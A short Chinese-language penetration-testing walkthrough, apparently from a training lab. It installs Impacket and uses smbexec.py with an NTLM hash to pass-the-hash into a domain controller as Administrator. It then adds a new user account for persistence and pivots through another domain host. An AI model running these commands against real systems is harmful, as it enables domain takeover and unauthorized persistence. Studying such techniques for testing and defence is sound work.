## Impacket实现域控NTML的hash传递

> 这里发现密码是无法获取的，因为NTLM是密文，我们可以使用hash传递，不过这里得使用Impacket的包

首先我们要先去GitHub下载源码，或者直接使用

```
 复制代码
 隐藏代码git clone https://github.com/SecureAuthCorp/impacket.git
```

然后解压缩，进入impacket

```
 复制代码
 隐藏代码cd impacket/
```

然后运行

```
 复制代码
 隐藏代码python setup.py install
```

工具都在这个目录里impacket/examples

```
 复制代码
 隐藏代码cd impacket/examples
```

> ![](../Images/b8907fbba8e88dae1bb4a31c229f00bf.png)

接着我们使用smbexec.py这个模块，用上面的ntml值hash传递登陆域控机子

```
 复制代码
 隐藏代码proxychains4 python3 smbexec.py -hashes :61465a991b168727b65b3644aab823cd ZKAQ/Administrator@10.0.1.6
```

成功拿下域控的超级管理员权限

> ![](../Images/b0700d69fe2be67a8955339651409281.png)

接下来是基础操作添加超管账号，然后登陆域控

```
 复制代码
 隐藏代码
net user gylq ********** /add #密码打长的，2008有限制，密码不能太简单
```

> ![](../Images/73106d26837749b7d4c1da9f7357a681.png)

直接代理登陆域控10.0.1.6就报错，这是域控机的守护机制

> ![](../Images/648f82e3a3083fa75895c8faa2b367e2.png)

需要使用他域内的机子去登陆，我们先登陆10.0.1.8，再登陆域控
